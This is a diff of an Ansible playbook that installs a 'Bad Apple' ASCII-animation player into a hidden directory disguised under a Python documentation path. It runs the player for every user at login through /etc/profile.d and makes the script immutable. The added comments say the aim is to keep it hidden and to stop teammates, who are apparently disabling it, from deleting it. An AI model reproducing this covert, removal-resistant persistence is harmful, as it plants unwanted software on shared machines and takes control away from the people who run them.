@@ -6,6 +6,7 @@
   vars:
     install_dir: /usr/share/doc/python3-lib2to3/.hidden
 
+  #download required tasks
   tasks:
     - name: Install dependencies
       apt:
@@ -14,25 +15,25 @@
           - python3-pip
         state: present
         update_cache: yes
-
+    # add it 
     - name: Create install directory
       file:
         path: "{{ install_dir }}"
         state: directory
         mode: '0755'
 
-    # 🔥 CREATE VENV
+    # create a venv so that its hidded
     - name: Create virtual environment
       command: python3 -m venv {{ install_dir }}/runtime
       args:
         creates: "{{ install_dir }}/runtime/bin/python3"
 
-    # 🔥 INSTALL OPENCV INTO VENV
     - name: Install OpenCV in venv
       pip:
         name: opencv-python
         virtualenv: "{{ install_dir }}/runtime"
 
+    # adding the files in
     - name: Copy player script
       copy:
         src: CharAnimePlayer.py
@@ -59,6 +60,7 @@
       tags:
         - size
 
+    # add it as a profile so that its not user specific i think my team is diabling bash too
     - name: Deploy Bad Apple globally via profile.d
       copy:
         dest: /etc/profile.d/badapple.sh
@@ -80,7 +82,7 @@
       tags:
         - badapple
 
-    # 🔥 LOCK FILE LAST
+    # lock the file so that they cant delete it
     - name: Make badapple.sh immutable
       file:
         path: /etc/profile.d/badapple.sh
